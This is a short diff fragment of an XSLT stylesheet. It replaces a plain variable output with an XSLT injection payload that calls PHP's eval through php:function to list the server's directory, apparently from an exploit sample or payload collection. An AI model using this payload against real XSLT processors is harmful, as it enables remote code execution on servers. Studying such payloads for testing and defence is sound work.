@@ -7,7 +7,7 @@
 <xsl:variable name="eval">
         eval("var_dump(scandir('.'));")
 </xsl:variable>
-  <xsl:value-of select="$eval"/> 
+  <xsl:value-of select="php:function('eval','var_dump(scandir(\'.\'));')"/> 
 
   
   
